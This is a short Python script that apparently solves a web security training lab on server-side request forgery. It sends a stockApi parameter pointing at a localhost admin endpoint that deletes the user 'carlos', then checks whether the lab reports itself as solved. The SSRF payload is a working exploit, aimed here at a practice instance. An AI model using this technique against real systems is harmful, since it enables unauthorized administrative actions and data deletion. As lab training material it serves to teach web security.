import requests
import argparse
import re

parser = argparse.ArgumentParser(description='Solves the following Lab: Basic SSRF against the local server')
parser.add_argument('--id', action='store', help='lab ID, ex: 0a6e00ec03ca2e848083672100ee00fb', required=True)
lab = parser.parse_args()

r = requests.post("https://" + lab.id + ".web-security-academy.net/product/stock", data={'stockApi':'http://localhost/admin/delete?username=carlos'})

try:
    assert('<p>Solved</p>' in requests.get("https://" + lab.id + ".web-security-academy.net/").text)
    print('Lab solved.')
except Exception:
    print("Error while trying to solve the lab.")